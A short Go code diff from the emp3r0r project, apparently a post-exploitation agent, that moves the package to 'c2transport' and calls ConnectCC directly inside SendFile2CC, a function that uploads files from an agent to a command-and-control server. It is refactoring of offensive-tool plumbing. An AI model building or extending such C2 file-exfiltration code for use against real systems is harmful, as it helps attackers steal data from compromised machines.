@@ -1,4 +1,4 @@
-package ftp
+package c2transport
 
 import (
 	"bufio"
@@ -13,7 +13,6 @@ import (
 	"time"
 
 	"github.com/cavaliergopher/grab/v3"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
@@ -181,7 +180,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 		def.CCAddress,
 		transport.FTPAPI,
 		token)
-	conn, _, _, err := c2transport.ConnectCC(url)
+	conn, _, _, err := ConnectCC(url)
 	log.Printf("sendFile2CC: connection: %s", url)
 	if err != nil {
 		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
